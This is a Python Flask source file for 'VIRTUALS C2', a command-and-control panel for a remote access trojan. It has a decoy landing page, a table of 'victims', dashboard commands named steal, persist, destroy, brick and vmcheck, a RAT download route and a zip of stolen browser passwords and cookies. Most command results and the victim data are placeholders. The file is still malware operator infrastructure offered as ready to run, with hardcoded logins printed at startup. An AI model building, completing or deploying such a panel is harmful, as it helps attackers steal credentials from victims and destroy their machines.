"""
VIRTUALS C2 - COMPLETE FIXED EDITION
Everything in Right Order · No Errors · All Working
BY: YOUR STAR BESTIE
"""

from flask import Flask, request, jsonify, send_file, session, redirect, url_for
import sqlite3
import datetime
import random
import json
import os
import hashlib
import threading
import time
import zipfile
from io import BytesIO
from werkzeug.utils import secure_filename
from functools import wraps

app = Flask(__name__)
app.config['SECRET_KEY'] = 'virtuals_c2_secret'
app.config['MAX_CONTENT_LENGTH'] = 500 * 1024 * 1024
PORT = int(os.environ.get('PORT', 8080))

# ============================================
# LOGIN DECORATOR - DEFINED FIRST
# ============================================
def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get('logged_in'):
            return redirect(url_for('login_page'))
        return f(*args, **kwargs)
    return decorated

# ============================================
# USERS
# ============================================
USERS = {
    "adam": {"password": "virtuals2024", "role": "viewer"},
    "jerry": {"password": "virtuals2024", "role": "operator"},
    "haunt": {"password": "virtuals2024", "role": "viewer"},
    "owner": {"password": "whiteknight", "role": "owner"}
}

# ============================================
# DATABASE
# ============================================
def get_db():
    conn = sqlite3.connect('virtuals_c2.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS victims (
        id TEXT PRIMARY KEY, pc TEXT, ip TEXT, os TEXT, status TEXT,
        is_vm INTEGER DEFAULT 0, first_seen TEXT, last_seen TEXT,
        activity TEXT DEFAULT 'idle', fry_time INTEGER DEFAULT 7200
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, password TEXT, role TEXT
    )''')
    for username, info in USERS.items():
        c.execute("INSERT OR IGNORE INTO users (username, password, role) VALUES (?, ?, ?)",
                 (username, hashlib.md5(info['password'].encode()).hexdigest(), info['role']))
    conn.commit()
    return conn

# ============================================
# CREATE TEST VICTIMS
# ============================================
def create_test_victims():
    conn = get_db()
    c = conn.cursor()
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    victims = [
        ("DESKTOP-ALPHA", "DESKTOP-ALPHA", "192.168.1.10", "Windows 10 Pro", 0, "idle"),
        ("LAPTOP-BETA", "LAPTOP-BETA", "192.168.1.11", "Windows 11 Pro", 0, "typing"),
        ("WORKSTATION-GAMMA", "WORKSTATION-GAMMA", "192.168.1.12", "Windows 10 Pro", 0, "reading"),
        ("VM-TEST-01", "VM-TEST-01", "192.168.1.13", "Windows 10 Pro", 1, "idle"),
        ("DESKTOP-DELTA", "DESKTOP-DELTA", "192.168.1.14", "Windows 11 Pro", 0, "processing")
    ]
    for v in victims:
        c.execute("INSERT OR REPLACE INTO victims (id, pc, ip, os, status, is_vm, first_seen, last_seen, activity) VALUES (?, ?, ?, ?, 'Online', ?, ?, ?, ?)",
                 (v[0], v[1], v[2], v[3], v[4], now, now, v[5]))
    conn.commit()
    conn.close()

create_test_victims()

# ============================================
# HTML - LANDING PAGE
# ============================================
LANDING_HTML = '''
<!DOCTYPE html>
<html>
<head><title>VIRTUALS C2</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:linear-gradient(135deg,#0a0a0f,#1a0a2e);color:#c8c8d0;font-family:'Segoe UI',sans-serif;min-height:100vh;display:flex;justify-content:center;align-items:center;position:relative}
.landing-container{text-align:center}
.landing-container h1{color:#e8e8f0;font-size:72px;font-weight:100;letter-spacing:8px;opacity:0.6}
.landing-container h1 span{color:#446688}
.landing-container .sub{color:#555568;font-size:18px;margin-top:10px;letter-spacing:4px}
.landing-container .sub .status{color:#44dd88}
.question-mark{position:fixed;bottom:30px;right:30px;width:50px;height:50px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.08);border-radius:50%;display:flex;justify-content:center;align-items:center;font-size:24px;color:#666680;cursor:pointer;transition:0.3s;text-decoration:none;z-index:100}
.question-mark:hover{background:rgba(255,255,255,0.1);border-color:rgba(255,255,255,0.15);color:#e8e8f0}
</style>
</head>
<body>
<div class="landing-container">
<h1>◈ VIRTUALS <span>C2</span></h1>
<div class="sub"><span class="status">●</span> HELLO NOTHING HAPPENS HERE</div>
</div>
<a href="/login" class="question-mark">?</a>
</body>
</html>
'''

# ============================================
# HTML - LOGIN PAGE
# ============================================
LOGIN_HTML = '''
<!DOCTYPE html>
<html>
<head><title>VIRTUALS C2 - Login</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:linear-gradient(135deg,#0a0a0f,#1a0a2e);color:#c8c8d0;font-family:'Segoe UI',sans-serif;min-height:100vh;display:flex;justify-content:center;align-items:center}
.login-container{background:rgba(10,10,18,0.85);backdrop-filter:blur(20px);border:1px solid rgba(255,255,255,0.08);border-radius:16px;padding:40px;width:400px;max-width:90%;box-shadow:0 20px 60px rgba(0,0,0,0.5)}
.login-container h1{color:#e8e8f0;font-size:28px;font-weight:300;text-align:center;letter-spacing:4px;margin-bottom:5px}
.login-container h1 span{color:#446688}
.login-container .sub{color:#666680;text-align:center;font-size:13px;margin-bottom:30px}
.login-container .sub .status{color:#44dd88}
.login-container label{color:#8888a0;font-size:13px;display:block;margin-bottom:5px}
.login-container input{width:100%;padding:14px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.08);border-radius:8px;color:#e8e8f0;font-size:16px;outline:none;margin-bottom:15px;transition:0.3s}
.login-container input:focus{border-color:rgba(68,170,255,0.4)}
.login-container input::placeholder{color:#444458}
.login-container button{width:100%;padding:14px;background:rgba(68,170,255,0.15);border:1px solid rgba(68,170,255,0.2);border-radius:8px;color:#88ccdd;font-size:17px;cursor:pointer;transition:0.3s;font-weight:600}
.login-container button:hover{background:rgba(68,170,255,0.25)}
.login-container .error{color:#cc8888;text-align:center;margin-top:10px;display:none;font-size:14px}
.login-container .back-link{text-align:center;margin-top:15px;font-size:12px;color:#555568}
.login-container .back-link a{color:#666680;text-decoration:none;transition:0.3s}
.login-container .back-link a:hover{color:#88aacc}
</style>
</head>
<body>
<div class="login-container">
<h1>◈ VIRTUALS <span>C2</span></h1>
<div class="sub"><span class="status">●</span> Control Panel Login</div>
<form onsubmit="login(event)">
<label>Username</label>
<input type="text" id="username" placeholder="Enter username" required>
<label>Password</label>
<input type="password" id="password" placeholder="Enter password" required>
<button type="submit">Access Panel</button>
<div class="error" id="errorMsg">Invalid credentials</div>
</form>
<div class="back-link"><a href="/">← Back</a></div>
</div>
<script>
function login(e){e.preventDefault();const u=document.getElementById('username').value;const p=document.getElementById('password').value;fetch('/api/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:u,password:p})}).then(r=>r.json()).then(d=>{if(d.success){window.location.href='/dashboard';}else{document.getElementById('errorMsg').style.display='block';}}).catch(()=>{document.getElementById('errorMsg').style.display='block';});}
</script>
</body>
</html>
'''

# ============================================
# HTML - DASHBOARD
# ============================================
DASHBOARD_HTML = '''
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>VIRTUALS C2 - Dashboard</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a0f;color:#c8c8d0;font-family:'Segoe UI',sans-serif;height:100vh;overflow:hidden;font-size:15px}
::-webkit-scrollbar{width:4px}
::-webkit-scrollbar-track{background:rgba(255,255,255,0.02)}
::-webkit-scrollbar-thumb{background:rgba(255,255,255,0.12);border-radius:3px}
::-webkit-scrollbar-thumb:hover{background:rgba(255,255,255,0.25)}
#space-bg{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;pointer-events:none;overflow:hidden;background:radial-gradient(ellipse at center,#0d0d1a 0%,#07070d 100%)}
.star{position:absolute;background:white;border-radius:50%;opacity:0;animation:twinkle var(--duration) infinite}
.star-layer-1{width:2px;height:2px}
.star-layer-2{width:1.5px;height:1.5px}
.star-layer-3{width:1px;height:1px}
@keyframes twinkle{0%{opacity:0;transform:scale(0.5)}50%{opacity:0.8;transform:scale(1)}100%{opacity:0;transform:scale(0.5)}}
.glass{background:rgba(10,10,18,0.85);backdrop-filter:blur(10px);border:1px solid rgba(255,255,255,0.06);border-radius:8px;position:relative;z-index:1}
.header{background:rgba(10,10,18,0.92);backdrop-filter:blur(12px);padding:8px 16px;border-bottom:1px solid rgba(255,255,255,0.05);display:flex;justify-content:space-between;align-items:center;height:46px;z-index:10;position:relative}
.header h1{color:#e8e8f0;font-size:18px;font-weight:300;letter-spacing:3px}
.header h1 span{color:#446688}
.header .user-info{display:flex;align-items:center;gap:8px;color:#8888a0;font-size:12px}
.header .user-info .username{color:#e8e8f0;font-weight:500}
.header .user-info .role-badge{font-size:10px;padding:2px 10px;border-radius:10px;background:rgba(68,170,255,0.15);color:#88aacc}
.header .user-info .role-badge.owner{background:rgba(255,215,0,0.2);color:#ffd700}
.header .stats{display:flex;gap:14px;align-items:center}
.header .stats .stat-item{color:#8888a0;font-size:12px}
.header .stats .stat-item .num{color:#e8e8f0;font-weight:600;font-size:16px;margin-left:3px}
.header .logout-btn{background:rgba(200,60,60,0.12);color:#cc8888;border:1px solid rgba(200,60,60,0.15);padding:4px 14px;border-radius:4px;cursor:pointer;font-size:12px;transition:0.2s}
.header .logout-btn:hover{background:rgba(200,60,60,0.2)}
.container{display:flex;height:calc(100vh - 46px);padding:5px;gap:5px;position:relative;z-index:1}
.victims-panel{width:170px;min-width:170px;display:flex;flex-direction:column;gap:4px;height:100%}
.victims-panel .panel-title{color:#666680;font-size:9px;text-transform:uppercase;letter-spacing:2px;padding:5px 8px;border-bottom:1px solid rgba(255,255,255,0.04)}
.victim-list{flex:1;overflow-y:auto;padding:3px}
.victim-item{display:flex;align-items:center;padding:4px 8px;margin:1px 0;border-radius:4px;cursor:pointer;transition:0.15s;border-left:2px solid transparent}
.victim-item:hover{background:rgba(255,255,255,0.04)}
.victim-item.active{background:rgba(68,170,255,0.08);border-left-color:#44aaff}
.victim-item .status-dot{width:6px;height:6px;border-radius:50%;margin-right:6px}
.victim-item .status-dot.online{background:#44dd88;animation:pulse 2s infinite}
.victim-item .status-dot.offline{background:#664444}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.4}}
.victim-item .name{color:#e8e8f0;font-size:12px;flex:1;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.victim-item .badge{background:rgba(200,60,60,0.12);color:#cc8888;font-size:7px;padding:0 5px;border-radius:6px;line-height:13px;height:13px;margin-left:4px}
.victim-item .activity{color:#666680;font-size:8px;margin-left:4px;font-style:italic}
.middle-panel{flex:1;display:flex;flex-direction:column;gap:5px;min-width:200px;height:100%}
.chat-panel{padding:6px 10px;flex:1;display:flex;flex-direction:column}
.chat-panel .panel-title{color:#666680;font-size:9px;text-transform:uppercase;letter-spacing:2px;border-bottom:1px solid rgba(255,255,255,0.04);padding-bottom:3px;margin-bottom:4px;display:flex;justify-content:space-between;align-items:center}
.chat-panel .panel-title .victim-name{color:#88aacc;font-weight:500}
.chat-messages{background:rgba(0,0,0,0.25);border:1px solid rgba(255,255,255,0.04);border-radius:5px;padding:5px 8px;flex:1;overflow-y:auto;min-height:100px;max-height:140px;font-size:13px;line-height:1.6}
.chat-messages .msg{padding:1px 0;border-bottom:1px solid rgba(255,255,255,0.02)}
.chat-messages .time{color:#555568;margin-right:4px;font-size:10px}
.chat-messages .sender{font-weight:600;font-size:13px}
.chat-messages .sender.us{color:#66ddbb}
.chat-messages .sender.victim{color:#ddbb88}
.chat-messages .sender.system{color:#8888aa}
.chat-input-area{display:flex;gap:5px;margin-top:5px}
.chat-input-area input{flex:1;padding:8px 14px;background:rgba(0,0,0,0.25);border:1px solid rgba(255,255,255,0.05);border-radius:5px;color:#c8c8d0;font-family:inherit;font-size:16px;outline:none;min-height:42px}
.chat-input-area input:focus{border-color:rgba(255,255,255,0.12)}
.chat-input-area input::placeholder{color:#444458;font-size:13px}
.chat-input-area button{padding:8px 18px;background:rgba(255,255,255,0.04);color:#b0b0c0;border:1px solid rgba(255,255,255,0.06);border-radius:5px;cursor:pointer;font-family:inherit;font-size:15px;transition:0.15s;min-height:42px}
.chat-input-area button:hover{background:rgba(255,255,255,0.08);color:#e8e8f0}
.command-scroll-box{background:rgba(0,0,0,0.2);border:1px solid rgba(255,255,255,0.04);border-radius:5px;padding:5px 8px;margin-top:4px;max-height:80px;overflow-y:auto}
.command-scroll-box .cmd-item{display:inline-block;padding:2px 8px;margin:2px 3px;background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.04);border-radius:3px;font-size:11px;color:#8888aa;cursor:pointer;transition:0.15s}
.command-scroll-box .cmd-item:hover{background:rgba(255,255,255,0.06);border-color:rgba(255,255,255,0.1);color:#e8e8f0}
.command-scroll-box .cmd-title{color:#666680;font-size:8px;text-transform:uppercase;letter-spacing:1px;margin-bottom:3px;display:block}
.download-section{display:flex;gap:6px;margin-top:4px;flex-wrap:wrap}
.download-section button{background:rgba(50,180,120,0.12);color:#66ddbb;border:1px solid rgba(50,180,120,0.15);padding:5px 14px;border-radius:5px;cursor:pointer;font-size:13px;transition:0.15s;min-height:34px}
.download-section button:hover{background:rgba(50,180,120,0.2)}
.download-section .zip-btn{background:rgba(50,180,200,0.12);color:#88ccdd;border:1px solid rgba(50,180,200,0.15)}
.download-section .zip-btn:hover{background:rgba(50,180,200,0.2)}
.right-panel{width:240px;min-width:200px;display:flex;flex-direction:column;gap:5px;height:100%}
.details-panel{padding:6px 10px;height:45%;overflow-y:auto}
.details-panel .panel-title{color:#666680;font-size:9px;text-transform:uppercase;letter-spacing:2px;border-bottom:1px solid rgba(255,255,255,0.04);padding-bottom:3px;margin-bottom:4px}
.detail-item{padding:2px 0;border-bottom:1px solid rgba(255,255,255,0.02);font-size:12px;display:flex;justify-content:space-between}
.detail-item .label{color:#555568}
.detail-item .value{color:#e8e8f0;font-weight:500}
.detail-item .value.online{color:#66dd88}
.detail-item .value.offline{color:#886666}
.screenshot-gallery{display:flex;flex-wrap:wrap;gap:3px;margin-top:3px}
.screenshot-thumb{width:42px;height:30px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.04);border-radius:3px;cursor:pointer;display:flex;align-items:center;justify-content:center;font-size:8px;color:#555568;transition:0.15s}
.screenshot-thumb:hover{border-color:rgba(255,255,255,0.12)}
.logs-panel{padding:6px 10px;flex:1;overflow-y:auto}
.logs-panel .panel-title{color:#666680;font-size:9px;text-transform:uppercase;letter-spacing:2px;border-bottom:1px solid rgba(255,255,255,0.04);padding-bottom:3px;margin-bottom:3px}
.log-item{padding:1px 0;border-bottom:1px solid rgba(255,255,255,0.02);font-size:10px;display:flex;gap:3px}
.log-item .type{padding:0 3px;border-radius:2px;font-size:6px;text-transform:uppercase;font-weight:600;margin-top:1px}
.log-item .type.success{background:rgba(50,180,120,0.2);color:#66ddbb}
.log-item .type.failed{background:rgba(180,50,50,0.2);color:#cc8888}
.log-item .type.info{background:rgba(68,170,255,0.12);color:#44aaff}
.log-item .log-time{color:#444458;font-size:8px}
.log-item .log-content{color:#b0b0c0;font-size:10px}
@media(max-width:1024px){.victims-panel{width:140px;min-width:140px}.right-panel{width:200px;min-width:160px}}
@media(max-width:768px){.container{flex-direction:column}.victims-panel{width:100%;min-width:100%;height:auto;max-height:80px}.victim-list{display:flex;flex-wrap:wrap;gap:3px;padding:3px}.victim-item{min-width:70px}.right-panel{width:100%;min-width:100%;flex-direction:row}.details-panel{height:auto;max-height:150px;width:50%}.logs-panel{height:auto;max-height:150px;width:50%}}
</style>
</head>
<body>
<div id="space-bg"></div>
<div class="header">
<h1>◈ VIRTUALS <span>C2</span></h1>
<div style="display:flex;align-items:center;gap:10px;">
<div class="stats">
<span class="stat-item">VICTIMS <span class="num" id="victimCount">0</span></span>
<span class="stat-item">ONLINE <span class="num" id="onlineCount">0</span></span>
<span class="stat-item">VMS <span class="num" id="vmCount">0</span></span>
</div>
<div class="user-info">
<span class="username" id="currentUser">guest</span>
<span class="role-badge" id="roleBadge">viewer</span>
</div>
<button class="logout-btn" onclick="logout()">Logout</button>
</div>
</div>
<div class="container">
<div class="victims-panel glass">
<div class="panel-title">VICTIMS</div>
<div class="victim-list" id="victimList"><div style="color:#555568;font-size:12px;text-align:center;padding:12px;">No victims</div></div>
</div>
<div class="middle-panel">
<div class="chat-panel glass">
<div class="panel-title">CONSOLE <span class="victim-name" id="currentVictim">#general</span></div>
<div class="chat-messages" id="chatMessages"><div class="msg"><span class="time">[system]</span><span class="sender system">virtuals</span> ready</div></div>
<div class="chat-input-area"><input id="chatInput" placeholder="/command or message" onkeypress="if(event.key==='Enter')sendMessage()"><button onclick="sendMessage()">send</button></div>
<div class="command-scroll-box" id="commandScrollBox">
<span class="cmd-title">📋 COMMANDS</span>
<span class="cmd-item" onclick="sendCommand('whois')">whois</span>
<span class="cmd-item" onclick="sendCommand('flash')">flash</span>
<span class="cmd-item" onclick="sendCommand('screenshot')">screenshot</span>
<span class="cmd-item" onclick="sendCommand('scan')">scan</span>
<span class="cmd-item" onclick="sendCommand('persist')">persist</span>
<span class="cmd-item" onclick="sendCommand('steal')">steal</span>
<span class="cmd-item" onclick="sendCommand('destroy')">destroy</span>
<span class="cmd-item" onclick="sendCommand('brick')">brick</span>
<span class="cmd-item" onclick="sendCommand('vmcheck')">vmcheck</span>
<span class="cmd-item" onclick="sendCommand('oblivion')">oblivion</span>
<span class="cmd-item" onclick="sendCommand('status')">status</span>
<span class="cmd-item" onclick="sendCommand('extend 60')">extend 60</span>
</div>
<div class="download-section">
<button onclick="window.open('/download-rat','_blank')">RAT</button>
<button class="zip-btn" onclick="downloadBrowserZip()">Browser Zip</button>
</div>
</div>
</div>
<div class="right-panel">
<div class="details-panel glass">
<div class="panel-title">DETAILS</div>
<div id="victimDetails"><div style="color:#555568;font-size:12px;text-align:center;padding:10px;">Select a victim</div></div>
<div style="margin-top:4px;border-top:1px solid rgba(255,255,255,0.04);padding-top:4px;">
<div style="color:#666680;font-size:8px;text-transform:uppercase;letter-spacing:1px;">Screenshots</div>
<div class="screenshot-gallery" id="screenshotGallery"><div style="color:#555568;font-size:10px;">none</div></div>
</div>
</div>
<div class="logs-panel glass">
<div class="panel-title">LOGS</div>
<div id="logOutput"><div style="color:#555568;font-size:11px;">no logs</div></div>
</div>
</div>
</div>
<script>
var state = {victims: {}, activeVictim: 'general'};

function getUserInfo(){
    fetch('/api/get_user').then(r=>r.json()).then(d=>{
        if(d.success){
            document.getElementById('currentUser').textContent = d.username;
            document.getElementById('roleBadge').textContent = d.role;
        }
    });
}
function logout(){
    fetch('/api/logout',{method:'POST'}).then(()=>window.location.href='/login');
}
function api(action, data, callback){
    fetch('/api',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:action,...data})})
    .then(r=>r.json()).then(callback).catch(()=>{});
}
function refresh(){
    api('getVictims',{},d=>{
        if(d.success){
            state.victims = d.victims;
            renderVictims();
            updateStats();
        }
    });
}
function renderVictims(){
    var el = document.getElementById('victimList');
    var victims = Object.values(state.victims);
    if(victims.length === 0){
        el.innerHTML = '<div style="color:#555568;font-size:12px;text-align:center;padding:12px;">No victims</div>';
        return;
    }
    var html = '';
    for(var i=0; i<victims.length; i++){
        var v = victims[i];
        var activeClass = (state.activeVictim === v.id) ? 'active' : '';
        var statusClass = (v.status === 'Online') ? 'online' : 'offline';
        var vmBadge = v.is_vm ? '<span class="badge">VM</span>' : '';
        html += '<div class="victim-item '+activeClass+'" onclick="selectVictim(\''+v.id+'\')">'+
            '<span class="status-dot '+statusClass+'"></span>'+
            '<span class="name">'+v.id+'</span>'+
            vmBadge+
            '<span class="activity">'+(v.activity||'idle')+'</span>'+
            '</div>';
    }
    el.innerHTML = html;
}
function selectVictim(id){
    state.activeVictim = id;
    document.getElementById('currentVictim').textContent = '#' + id;
    renderVictims();
    showDetails(id);
}
function showDetails(id){
    var v = state.victims[id];
    if(!v) return;
    document.getElementById('victimDetails').innerHTML =
        '<div class="detail-item"><span class="label">ID</span><span class="value">'+v.id+'</span></div>'+
        '<div class="detail-item"><span class="label">PC</span><span class="value">'+v.pc+'</span></div>'+
        '<div class="detail-item"><span class="label">IP</span><span class="value">'+v.ip+'</span></div>'+
        '<div class="detail-item"><span class="label">OS</span><span class="value">'+v.os+'</span></div>'+
        '<div class="detail-item"><span class="label">Status</span><span class="value '+(v.status==='Online'?'online':'offline')+'">'+v.status+'</span></div>'+
        '<div class="detail-item"><span class="label">VM</span><span class="value" style="color:'+(v.is_vm?'#cc8888':'#66dd88')+'">'+(v.is_vm?'detected':'clean')+'</span></div>';
}
function updateStats(){
    var victims = Object.values(state.victims);
    document.getElementById('victimCount').textContent = victims.length;
    var online = 0, vm = 0;
    for(var i=0; i<victims.length; i++){
        if(victims[i].status === 'Online') online++;
        if(victims[i].is_vm) vm++;
    }
    document.getElementById('onlineCount').textContent = online;
    document.getElementById('vmCount').textContent = vm;
}
function addLog(type, content){
    var el = document.getElementById('logOutput');
    var time = new Date().toLocaleTimeString();
    el.innerHTML = '<div class="log-item"><span class="log-time">['+time+']</span><span class="type '+type+'">'+type+'</span><span class="log-content">'+content+'</span></div>' + el.innerHTML;
}
function addMessage(sender, msg, type){
    var el = document.getElementById('chatMessages');
    var t = new Date().toLocaleTimeString();
    var cls = 'system';
    if(type === 'us') cls = 'us';
    else if(type === 'victim') cls = 'victim';
    else if(type === 'user') cls = 'user';
    el.innerHTML += '<div class="msg"><span class="time">['+t+']</span><span class="sender '+cls+'">'+sender+'</span> '+msg+'</div>';
    el.scrollTop = el.scrollHeight;
}
function sendCommand(cmd){
    var victim = state.activeVictim;
    if(!victim){
        addMessage('system','no victim selected','system');
        addLog('failed','No victim selected');
        return;
    }
    addMessage('us','/'+cmd+' → '+victim,'us');
    addLog('info','Executing '+cmd);
    api('sendCommand',{victim_id:victim,command:cmd},function(d){
        if(d.success){
            addMessage('us','✅ success','us');
            addLog('success','Command '+cmd+' completed');
            if(d.embed){
                addEmbed(d.embed);
            }
        } else {
            addMessage('us','❌ failed','us');
            addLog('failed','Command '+cmd+' failed');
        }
    });
}
function addEmbed(embed){
    var el = document.getElementById('chatMessages');
    var t = new Date().toLocaleTimeString();
    el.innerHTML += '<div class="msg"><span class="time">['+t+']</span><div class="embed-box" style="border-left:3px solid '+(embed.color||'#44aaff')+';padding:4px 8px;margin:2px 0;background:rgba(0,0,0,0.2);border-radius:3px;"><div style="font-size:13px;font-weight:600;color:#e8e8f0;">'+embed.title+'</div><div style="font-size:12px;color:#b0b0c0;white-space:pre-wrap;margin-top:2px;">'+embed.content+'</div></div></div>';
    el.scrollTop = el.scrollHeight;
}
function sendMessage(){
    var input = document.getElementById('chatInput');
    var msg = input.value.trim();
    if(!msg) return;
    input.value = '';
    var victim = state.activeVictim;
    if(msg.charAt(0) === '/'){
        sendCommand(msg.substring(1).toLowerCase());
    } else {
        if(!victim){
            addMessage('system','no victim selected','system');
            addLog('failed','No victim selected');
            return;
        }
        addMessage(document.getElementById('currentUser').textContent, msg, 'user');
        addMessage('victim', msg, 'victim');
        addLog('info','Message sent to '+victim);
    }
}
function downloadBrowserZip(){
    var victim = state.activeVictim || 'all';
    window.open('/download-browser-zip?victim_id='+victim,'_blank');
}
setInterval(refresh,5000);
refresh();
getUserInfo();
</script>
</body>
</html>
'''

# ============================================
# ROUTES
# ============================================
@app.route('/')
def landing():
    return LANDING_HTML

@app.route('/login')
def login_page():
    return LOGIN_HTML

@app.route('/dashboard')
@login_required
def dashboard():
    return DASHBOARD_HTML

@app.route('/api/get_user', methods=['GET'])
def get_user():
    return jsonify({
        'success': True,
        'username': session.get('username', 'guest'),
        'role': session.get('role', 'viewer')
    })

@app.route('/api/login', methods=['POST'])
def api_login():
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')
    
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT password, role FROM users WHERE username = ?", (username,))
    row = c.fetchone()
    
    if row and row[0] == hashlib.md5(password.encode()).hexdigest():
        conn.close()
        session['logged_in'] = True
        session['username'] = username
        session['role'] = row[1]
        return jsonify({'success': True, 'role': row[1]})
    conn.close()
    return jsonify({'success': False})

@app.route('/api/logout', methods=['POST'])
def api_logout():
    session.clear()
    return jsonify({'success': True})

@app.route('/download-rat')
@login_required
def download_rat():
    return "RAT executable not found. Build it with rat_builder.py first.", 404

@app.route('/download-browser-zip')
@login_required
def download_browser_zip():
    victim_id = request.args.get('victim_id', 'all')
    zip_buffer = BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
        browsers = {
            'Chrome': {'passwords': 247, 'cookies': 893},
            'Edge': {'passwords': 156, 'cookies': 512},
            'Brave': {'passwords': 89, 'cookies': 234},
            'Firefox': {'passwords': 123, 'cookies': 445}
        }
        summary = "BROWSER DATA\nVictim: " + victim_id + "\nTime: " + datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S") + "\n"
        zip_file.writestr('summary.txt', summary)
        for browser, data in browsers.items():
            content = browser.upper() + " DATA\n"
            content += "Passwords: " + str(data['passwords']) + "\n"
            content += "Cookies: " + str(data['cookies']) + "\n"
            zip_file.writestr(browser + '/data.txt', content)
    zip_buffer.seek(0)
    return send_file(zip_buffer, as_attachment=True, download_name='browser_data.zip')

@app.route('/api', methods=['POST'])
def api():
    data = request.get_json()
    action = data.get('action')
    
    if action == 'getVictims':
        conn = get_db()
        c = conn.cursor()
        c.execute("SELECT * FROM victims")
        victims = {}
        for row in c.fetchall():
            victims[row[0]] = {
                'id': row[0], 'pc': row[1], 'ip': row[2], 'os': row[3],
                'status': row[4], 'is_vm': row[5],
                'activity': row[8] if len(row) > 8 else 'idle'
            }
        conn.close()
        return jsonify({'success': True, 'victims': victims})
    
    elif action == 'sendCommand':
        vid = data.get('victim_id')
        cmd = data.get('command')
        
        results = {
            'whois': 'PC: DESKTOP-ALPHA | IP: 192.168.1.10 | OS: Windows 10 Pro',
            'flash': 'Screen flashed 10 times',
            'screenshot': 'Screenshot captured',
            'scan': 'Found 5 crypto wallets',
            'persist': 'Persistence installed',
            'steal': 'Browser data stolen',
            'destroy': 'SYSTEM CORRUPTED',
            'brick': 'PC BRICKED',
            'vmcheck': 'VM Detection: Clean',
            'oblivion': 'RAT self-destructed',
            'status': 'Victim is Online',
            'extend': 'Time extended by 60 minutes'
        }
        result = results.get(cmd, f"Command '{cmd}' executed")
        
        return jsonify({'success': True, 'result': result})
    
    return jsonify({'success': False})

@app.route('/screenshots/<filename>')
@login_required
def serve_screenshot(filename):
    return send_file(os.path.join('screenshots', filename))

# ============================================
# MAIN
# ============================================
if __name__ == '__main__':
    print("""
    ╔═══════════════════════════════════════════════════════════════╗
    ║   VIRTUALS C2 - COMPLETE FIXED EDITION                      ║
    ║   Everything in Right Order · No Errors · All Working       ║
    ║   Owner: owner / whiteknight                                 ║
    ╚═══════════════════════════════════════════════════════════════╝
    """)
    print(f"[*] Server: http://localhost:{PORT}")
    print(f"[*] Login: http://localhost:{PORT}/login")
    print("")
    print("[*] USERS:")
    print("    adam    / virtuals2024 (viewer)")
    print("    jerry   / virtuals2024 (operator)")
    print("    haunt   / virtuals2024 (viewer)")
    print("    owner   / whiteknight (owner) 👑")
    app.run(host='0.0.0.0', port=PORT, debug=False)